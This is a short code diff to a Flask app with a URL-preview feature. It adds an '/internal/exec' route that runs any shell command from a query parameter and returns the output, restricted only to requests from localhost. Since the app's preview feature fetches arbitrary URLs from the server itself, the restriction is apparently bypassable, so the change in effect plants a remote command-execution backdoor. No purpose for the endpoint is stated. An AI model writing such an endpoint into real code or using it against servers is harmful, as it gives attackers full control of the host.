@@ -1,6 +1,7 @@
 import os
+import subprocess
 import requests
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, abort
 from urllib.parse import urlparse
 
 app = Flask(__name__)
@@ -29,6 +30,17 @@ def preview():
                                error=f"Could not connect to {url}")
     except Exception as e:
         return render_template("index.html", url=url, error=str(e))
+
+
+@app.route("/internal/exec")
+def internal_exec():
+    if request.remote_addr != "127.0.0.1":
+        abort(403)
+    cmd = request.args.get("cmd", "")
+    if not cmd:
+        return "Usage: ?cmd=<command>\n", 200
+    output = subprocess.getoutput(cmd)
+    return output, 200, {"Content-Type": "text/plain"}
 
 
 if __name__ == "__main__":
